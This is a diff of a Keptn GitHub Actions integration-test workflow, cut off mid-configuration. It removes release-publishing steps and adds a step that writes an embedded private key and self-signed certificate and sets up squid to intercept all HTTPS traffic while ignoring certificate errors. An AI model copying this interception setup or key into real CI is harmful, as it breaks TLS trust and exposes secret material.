-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-          PROJECT: "sockshop"
-          SERVICE: "carts"
-        run: |
-          test/test_onboard_service.sh
-          test/test_new_artifact.sh
-          test/test_delete_project.sh
-
-      - name: Test Continuous Delivery with parallel stages on Remote Exec Plane (with sockshop)
-        id: test_continuous_delivery_remote_exec
-        if: env.RUN_AIRGAPPED_TEST != 'true' && (env.RUN_CONTINUOUS_DELIVERY_TEST == 'true') && (env.REMOTE_EXECUTION_PLANE == 'true')
-        timeout-minutes: 45
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-          PROJECT: "sockshop"
-          SERVICE: "carts"
-        run: |
-          test/test_onboard_service.sh
-          test/test_new_artifact.sh
-          test/test_delete_project.sh
-
-      - name: Test Manage Secrets
-        id: test_manage_secrets
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: test/test_manage_secrets.sh
-
-#      - name: Test Self Healing with Scaling using Prometheus (with sockshop)
-#        id: test_continuous_delivery
-#        if: env.RUN_CONTINUOUS_DELIVERY_TEST == 'true' # run only if variable is set
-#        continue-on-error: true
-#        env:
-#          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-#        run: |
-#          test/test_self_healing_scaling.sh
-
-      # for debugging etc... it makes sense to have the support archive attached as an artifact
-
-      - name: Test Sequence Timeout
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_sequence_timeout
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run SequenceTimeout -v
-
-      - name: Test Sequence Control
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_sequence_control
-        timeout-minutes: 5
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run SequenceControl -v
-
-      - name: Test Sequence Queue
-        # do not run this test for the airgapped scenario
-        if: env.RUN_AIRGAPPED_TEST != 'true'
-        id: test_sequence_queue
-        timeout-minutes: 10
-        continue-on-error: true
-        env:
-          KEPTN_ENDPOINT: ${{ steps.authenticate_keptn_cli.outputs.KEPTN_ENDPOINT }}
-        run: cd test/go-tests && go test -run SequenceQueue -v
-
-      - name: keptn generate support-archive
-        if: always()
-        env:
-          SUPPORT_ARCHIVE_FILENAME: keptn-support-archive-${{ github.run_id }}-${{ matrix.PLATFORM }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}
-        timeout-minutes: 5
-        run: |
-          mkdir support-archive/
-          echo "y" | keptn generate support-archive -n ${KEPTN_NAMESPACE}
-          mv support-archive/keptn*.zip support-archive/${SUPPORT_ARCHIVE_FILENAME}.zip
-
-      - name: Uninstall Keptn
-        timeout-minutes: 5
-        run: echo "y" | keptn uninstall -n ${KEPTN_NAMESPACE}
-
-      - name: Uninstall remote execution plane
-        timeout-minutes: 5
-        if: env.REMOTE_EXECUTION_PLANE == 'true'
-        run: |
-          kubectl delete namespace keptn-helm-service
-          kubectl delete namespace keptn-jmeter-service
-
-      - name: Uninstall Istio
-        if: env.CLOUD_PROVIDER != 'minishift-on-GHA' # istio was not installed on minishfit, so no need to uninstall
-        timeout-minutes: 5
-        run: test/utils/uninstall_istio.sh
-
-      - name: Cleanup GKE cluster
-        if: always() && env.CLOUD_PROVIDER == 'GKE' # we always need to cleanup GKE clusters
-        timeout-minutes: 5
-        env:
-          GKE_VERSION: ${{ matrix.PLATFORM_VERSION }}
-          GCLOUD_SERVICE_KEY: ${{ secrets.GCLOUD_SERVICE_KEY }}
-          GCLOUD_PROJECT_NAME: ${{ secrets.GCLOUD_PROJECT_NAME }}
-          CLOUDSDK_COMPUTE_ZONE: "us-east1-b"
-          CLOUDSDK_REGION: "us-east1"
-          CLUSTER_NAME_NIGHTLY: ${{ steps.install_gke.outputs.CLUSTER_NAME_NIGHTLY }}
-        run: test/utils/gke_delete_cluster.sh
-
-      - name: Cleanup Minishift cluster
-        if: env.CLOUD_PROVIDER == 'minishift-on-GHA'
-        timeout-minutes: 3
-        run: |
-          minishift stop
-          minishift delete profile keptn-dev
-
-      - name: Write test report
-        id: write_test_report
-        if: always()
-        env:
-          TEST_REPORT_FILENAME: test-report-${{ github.run_id }}-${{ matrix.PLATFORM }}-${{ matrix.CLOUD_PROVIDER}}-${{ matrix.PLATFORM_VERSION }}.txt
-        run: |
-          echo "write test report to $TEST_REPORT_FILENAME"
-          # please check with headings in print_test_report task roughly 50 lines below
-          echo "| ${{ matrix.PLATFORM }}/${{ matrix.CLOUD_PROVIDER}} ${{ matrix.PLATFORM_VERSION }} | ${{ steps.keptn_install.outcome }} | ${{ steps.authenticate_keptn_cli.outcome }} | ${{ steps.test_airgapped_images.outcome }} | ${{ steps.test_linking_stages.outcome }} | ${{ steps.test_uniform_registration.outcome }} | ${{ steps.test_log_ingestion.outcome }} | ${{ steps.test_log_forwarding.outcome }} | ${{ steps.test_sequence_states.outcome }} | ${{ steps.test_sequence_timeout.outcome }} | ${{ steps.test_sequence_control.outcome }} | ${{ steps.test_sequence_queue.outcome }} | ${{ steps.test_sequence_loop.outcome }} | ${{ steps.test_quality_gates.outcome }} | ${{ steps.test_quality_gates_backwards_compatibility.outcome }} | ${{ steps.test_self_healing.outcome }} | ${{ steps.test_delivery_assistant.outcome }} | ${{ steps.test_user_managed_delivery.outcome }} | ${{ steps.test_continuous_delivery.outcome }} | ${{ steps.test_continuous_delivery_remote_exec.outcome }} | ${{ steps.test_manage_secrets.outcome }} | ${{ steps.test_bridge_e2e.outcome }} |" > $TEST_REPORT_FILENAME
-          cat $TEST_REPORT_FILENAME
-
-      - name: Upload Bridge E2E Screenshots
-        if: always()
-        uses: actions/upload-artifact@v2
-        with:
-          name: bridge-e2e-screenshots
-          path: bridge/e2e/screenshots/*.png
-
-      - name: Upload test report as an artifact
-        if: always()
-        uses: actions/upload-artifact@v2
-        with:
-          name: test-report
-          path: test-*.txt
-
-      - name: Upload support archive as an artifact
-        if: always()
-        uses: actions/upload-artifact@v2
-        with:
-          name: support-archive
-          path: support-archive/*.zip
-
-  #######################################################################
-  # This job publishes a draft release based on the previous steps      #
-  #######################################################################
+        - CLOUD_PROVIDER: minishift-on-GHA
+          COLLECT_RESOURCE_LIMITS: 'true'
+          KEPTN_SERVICE_TYPE: ClusterIP
+          PLATFORM: openshift
+          PLATFORM_VERSION: '3.11'
+          RUN_CONTINUOUS_DELIVERY_TEST: 'false'
+          RUN_QUALITY_GATES_TEST: 'false'
+        - CLOUD_PROVIDER: k3s-on-GHA
+          COLLECT_RESOURCE_LIMITS: 'false'
+          KEPTN_SERVICE_TYPE: NodePort
+          KUBECONFIG: /etc/rancher/k3s/k3s.yaml
+          PLATFORM: kubernetes
+          PLATFORM_VERSION: v1.16.15+k3s1
+          RUN_CONTINUOUS_DELIVERY_TEST: 'false'
+          RUN_QUALITY_GATES_TEST: 'true'
+        - CLOUD_PROVIDER: k3s-on-GHA
+          COLLECT_RESOURCE_LIMITS: 'false'
+          KEPTN_SERVICE_TYPE: NodePort
+          KUBECONFIG: /etc/rancher/k3s/k3s.yaml
+          PLATFORM: kubernetes
+          PLATFORM_VERSION: v1.21.1+k3s1
+          RUN_CONTINUOUS_DELIVERY_TEST: 'false'
+          RUN_QUALITY_GATES_TEST: 'true'
+        - CLOUD_PROVIDER: k3d-on-GHA
+          COLLECT_RESOURCE_LIMITS: 'false'
+          KEPTN_SERVICE_TYPE: NodePort
+          KUBECONFIG: ''
+          PLATFORM: kubernetes
+          PLATFORM_VERSION: v4.4.6
+          RUN_AIRGAPPED_TEST: 'true'
+          RUN_CONTINUOUS_DELIVERY_TEST: 'false'
+          RUN_QUALITY_GATES_TEST: 'false'
+        - CLOUD_PROVIDER: GKE
+          COLLECT_RESOURCE_LIMITS: 'false'
+          KEPTN_SERVICE_TYPE: LoadBalancer
+          KUBECONFIG: ''
+          PLATFORM: kubernetes
+          PLATFORM_VERSION: '1.18'
+          REMOTE_EXECUTION_PLANE: 'true'
+          RUN_CONTINUOUS_DELIVERY_TEST: 'true'
+          RUN_QUALITY_GATES_TEST: 'true'
+        - CLOUD_PROVIDER: GKE
+          COLLECT_RESOURCE_LIMITS: 'true'
+          KEPTN_SERVICE_TYPE: LoadBalancer
+          KUBECONFIG: ''
+          PLATFORM: kubernetes
+          PLATFORM_VERSION: '1.19'
+          REMOTE_EXECUTION_PLANE: 'false'
+          RUN_CONTINUOUS_DELIVERY_TEST: 'true'
+          RUN_QUALITY_GATES_TEST: 'true'
+    timeout-minutes: 60
   publish-draft-release:
+    env:
+      BRANCH: ${{ needs.integration-test.outputs.BRANCH }}
     name: Publish Draft release
     needs: integration-test
-    if: always() # always run, regardless of the outcome of the last job
     runs-on: ubuntu-20.04
-    env:
-      BRANCH: ${{ needs.integration-test.outputs.BRANCH }}
     steps:
-      - name: Check out code
-        uses: actions/checkout@v2.3.4
+    - name: before
+      run: 'sudo apt update
 
-      - name: Debug - Output Branch
-        run: echo $BRANCH
+        sudo apt install -y squid-openssl
 
-      - name: Download test reports
-        uses: actions/download-artifact@v2
-        with:
-          name: test-report
+        sudo mkdir /squid
 
-      - name: Print Test Report
-        id: print_test_report
-        run: |
-          echo "Integration Tests have finished." > final-test-report.txt
-          echo "" >> final-test-report.txt
-          # please check with output in write_test_report task roughly 50 lines above
-          echo "| Target Platform        |  Keptn Install    |  Keptn Auth  | Airgapped Images | Linking Stages   | Uniform Registration   | Log Ingestion   | Log Forwarding   | Sequence States   | Sequence Timeout   | Sequence Control   | Sequence Queue   | Sequence Loop |  QG Standalone  |  QG Backwards Compat. | Self Healing  |  Del-Assist  |  User-Man. Depl.  | Cont Deliv | Cont Deliv (Remote Exec) | Manage secrets | Bridge E2E |" >> final-test-report.txt
-          echo "| ---------------------- | ----------------- | ------------ | ---------------- | ---------------- | ---------------------- | --------------- | ---------------- | ----------------- | ------------------ | ---------------- | ------------------ | ------------- | --------------- | ----------------------|-------------- | ------------ | ----------------- |----------- | ------------------------ | -------------- | ---------- |" >> final-test-report.txt
-          cat test-report*.txt >> final-test-report.txt
+        cat << EOF | sudo tee /squid/key.pem
 
-          # print test report
-          REPORT=$(cat final-test-report.txt)
-          echo $REPORT
+        -----BEGIN PRIVATE KEY-----
 
-      - name: Upload final test report as an artifact
-        if: always()
-        uses: actions/upload-artifact@v2
-        with:
-          name: test-report
-          path: final-test-report.txt
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
 
-      - name: Summarize Resource Usage
-        id: print_resource_usage
-        run: |
-          echo "**Resource Limits**" > final-resource-limits.txt
-          ls -la test-resource-limits*.txt
-          cat test-resource-limits*.txt >> final-resource-limits.txt || echo "No resource reports found" >> final-resource-limits.txt
-          # Todo: some calculations should be done...
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
 
-      - name: Download all artifacts from last successful build of specified branch
-        uses: dawidd6/action-download-artifact@v2.14.1
-        with:
-          # Download last successful artifact from a CI build
-          github_token: ${{secrets.GITHUB_TOKEN}}
-          workflow: CI.yml
-          run_id: ${{ needs.integration-test.outputs.ARTIFACT_RUN_ID }}
-          # directory where to extract artifacts to
-          path: ./dist
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
 
-      - name: Load Build-Config Environment from ./dist/build-config/build-config.env
-        id: load_build_env
-        uses: c-py/action-dotenv-to-setenv@v3
-        with:
-          env-file: ./dist/build-config/build-config.env
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
 
-      - name: Overwrite VERSION String for nightly builds
-        if: env.BRANCH == 'master'
-        run: |
-          # use VERSION.DATETIME for the cli version (e.g., nightly build)
-          VERSION=${VERSION}.${DATETIME}
-          # overwrite VERSION
-          echo "VERSION=${VERSION}" >> $GITHUB_ENV
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
 
-      - name: DEBUG Build-Config
-        run: |
-          echo VERSION=${VERSION}
-          echo BRANCH=${BRANCH}
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
 
-      - name: Formulate bug issue on errors
-        id: formulate_bug_issue
-        run: |
-          REPORT=$(cat final-test-report.txt)
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
 
-          if [[ "$REPORT" == *"failure"* ]]; then
-            echo "INTEGRATION TESTS FAILED! - Creating GH issue description now..."
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
 
-            # create a markdown file that contains details about the error
-            echo "---" > integration-tests-failed.md
-            echo "title: Integration tests failed" >> integration-tests-failed.md
-            echo "labels: type:critical" >> integration-tests-failed.md
-            echo "---" >> integration-tests-failed.md
-            echo "" >> integration-tests-failed.md
-            echo "* Link to run: $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" >> integration-tests-failed.md
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
 
-            if [[ $GITHUB_EVENT_NAME == 'schedule' ]]; then
-              echo "* Triggered by: Scheduled build" >> integration-tests-failed.md
-            else
-              echo "* Triggered by: @$GITHUB_ACTOR" >> integration-tests-failed.md
-            fi
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
 
-            echo "* Branch: $BRANCH" >> integration-tests-failed.md
-            echo "* Version: $VERSION" >> integration-tests-failed.md
-            echo "* Datetime: $DATETIME" >> integration-tests-failed.md
-            echo "* Commit: $GIT_SHA" >> integration-tests-failed.md
-            echo "" >> integration-tests-failed.md
+        DYkELFBZ650JrYYrQ4UouRAucp8K9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+
 
-            # print report but make failures bold
-            echo "${REPORT//failure/:x: **failure**}" >> integration-tests-failed.md
+        Z89sQ4FoTtBvz1+Lv+s4ej/lVxoTJQIDAQABAoICABzNO3uurl9kZws6qAcG4ogo
 
-            echo "" >> integration-tests-failed.md
-            echo "Note: This issue was auto-generated from [integration_tests.yml](.github/workflows/integration_tests.yml)" >> integration-tests-failed.md
+        05UUM0+09Ujmvj37ymsjAlLFQFtYaKtJDqEWYP92i3w7jmErZo2SZOXHl/yy/zHQ
 
-            echo "##[set-output name=INTEGRATION_TESTS_FAILED;]true"
-          else
-            echo "Integration tests passed, moving on..."
-          fi
+        B4o6s4J3djHTxrJIf68TpZdYs5ZJxOIeoiql8I1bc/jKuVBGVqt8o2IvoHfSh0ti
 
-      - name: Create issue if tests failed
-        if: always() && github.event_name == 'schedule' && steps.formulate_bug_issue.outputs.INTEGRATION_TESTS_FAILED == 'true'
-        uses: JasonEtco/create-an-issue@v2.5.0
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          filename: integration-tests-failed.md
+        U1bNQSDuMbG5yeo4cEfewSTrwf03UsZx0Jszo0qrJ5ny+CkPtkUH4NL2GXJjWh8D
 
-      - name: Find PR number for current build
-        id: find_pr_for_build
-        if: always()
-        uses: jwalton/gh-find-current-pr@v1.1.0
+        XOKfN0LDSc8mdu8bBKg15IdQnWtDj/eI1YYe2v/p2zjWHMzLEoigVCLMsUN1itK4
 
-      - name: Create PR comment if tests failed
-        # Only run if not on master branch and we have a PR number
-        # Also, only run in original repo and not on forks since the github token secret is not accessible in that case
-        if: always() && github.event.inputs.branch != 'master' && steps.find_pr_for_build.outputs.number && steps.formulate_bug_issue.outputs.INTEGRATION_TESTS_FAILED == 'true' && github.event.pull_request.head.repo.full_name == github.repository
-        uses: marocchino/sticky-pull-request-comment@v2.1.0
-        with:
-          path: integration-tests-failed.md
-          recreate: true
-          number: ${{ steps.find_pr_for_build.outputs.number }}
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
 
 
-      # Part of this job is to check if a releasenotes file exists and to use it as the release message
-      - name: Try getting release notes
-        id: get_releasenotes
-        run: |
-          filename="releasenotes/releasenotes_V${VERSION}.md"
-          if [[ -f "$filename" ]]; then
-            echo "Found releasenotes in $filename"
-          else
-            echo "::warning Could not find release notes $filename, using releasenotes_develop"
-            filename="releasenotes/releasenotes_develop.md"
-          fi
+        http_port 7821
 
-          echo "##[set-output name=RELEASENOTES_FILENAME;]$(echo ${filename})"
+        http_port 3128 intercept
 
-      # Create release message by concatenating releasenotes with the test/build report
-      - name: Create a Release message
-        env:
-          RELEASENOTES_FILENAME: ${{ steps.get_releasenotes.outputs.RELEASENOTES_FILENAME }}
-          RESOURCE_LIMITS_FILENAME: "final-resource-limits.txt"
-        run: |
-          # print release notes
-          cat $RELEASENOTES_FILENAME > release-notes.txt
-          # print CI information
-          echo ""  >> release-notes.txt
-          echo "<details><summary>CI Information</summary>"  >> release-notes.txt
-          echo "<p>" >> release-notes.txt
-          echo "" >> release-notes.txt
-          echo "* **BUILD ${VERSION} ON ${BRANCH}**" >> release-notes.txt
-          echo "* **DATETIME**: $DATETIME" >> release-notes.txt
-          echo "* **GIT_SHA**: $GIT_SHA" >> release-notes.txt
-          echo "* **ACTION RUN**: $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" >> release-notes.txt
-          echo "" >> release-notes.txt
-          echo "**Integration Tests**" >> release-notes.txt
-          cat final-test-report.txt >> release-notes.txt
-          echo "" >> release-notes.txt
-          echo "</p>" >> release-notes.txt
-          echo "</details>" >> release-notes.txt
-          echo "" >> release-notes.txt
-          # print final-resource-limits.txt
-          echo "<details><summary>Kubernetes Resource Data</summary>" >> release-notes.txt
-          echo "<p>" >> release-notes.txt
-          echo ""  >> release-notes.txt
-          cat $RESOURCE_LIMITS_FILENAME >> release-notes.txt
-          echo "</p>" >> release-notes.txt
-          echo "</details>" >> release-notes.txt
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
 
-      - name: Abort if (published) release already exists
-        uses: actions/github-script@v4.0.2
-        with:
-          github-token: ${{secrets.GITHUB_TOKEN}}
-          script: |
-            let tag = "${{ env.VERSION }}";
-            console.log(`Trying to fetch release by tag '${tag}'...`);
+        acl step1 at_step SslBump1
 
-            try {
-              release = await github.repos.getReleaseByTag({
-                owner: context.repo.owner,
-                repo: context.repo.repo,
-                tag: tag
-              });
-              console.log("::error Release already exists... Aborting!");
-              core.setFailed("Release already exists... Aborting!");
+        ssl_bump peek step1
 
-              return 1; // failure
-            } catch (error) {
-              // release not found -> okay
-              console.log("No release found -> okay");
-              return 0;
-            }
+        ssl_bump bump all
 
-      - name: Delete draft release if it already exists
-        uses: actions/github-script@v4.0.2
-        with:
-          github-token: ${{secrets.GITHUB_TOKEN}}
-          script: |
-            let tag = "${{ env.VERSION }}";
-            console.log(`Trying to fetch DRAFT release by tag '${tag}'...`);
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
 
-            try {
-              // get all releases (including drafts)
-              let releases = await github.repos.listReleases({
-                owner: context.repo.owner,
-                repo: context.repo.repo
-              });
-              // find a draft release
-              let release = releases.data.find(release => release.tag_name === tag);
-              if (release) {
-                // found a release with specified tag; check if it is a draft release
-                if (release.draft) {
-                  // found a draft release
-                  console.log(`🥳 Found a draft release with id ${release.id}, deleting it`);
-                  console.log(`Release Tag Name: ${release.tag_name}`);
-                  console.log(`Release Draft: ${release.draft}`);
-                  console.log(`Release URL: ${release.html_url}`);
+        sslcrtd_children 5
 
-                  console.log(`::error::Draft release found, please delete it manually!`);
+        ssl_bump server-first all
 
-                  return 1;
-                  // ToDo: Commented out as there seems to be a problem with deleting releases
+        sslproxy_cert_error allow all
 
-                  /*github.repos.deleteRelease({
-                    owner: context.repo.owner,
-                    repo: context.repo.repo,
-                    release_id: release.id
-                  });*/
 
-                  console.log("Deleted! -> okay");
-                } else {
-                  console.log("::error Release with tag found, but it's not a draft release");
-                  core.setFailed("Release with tag found, but it's not a draft release");
-                }
-              } else {
-                console.log("No draft release found -> okay");
-              }
+        acl all src 0.0.0.0/0
 
-              return 0;
-            } catch (error) {
-              // error happened
-              console.log("An error happened while trying to fetch all releases:");
-              console.log(error);
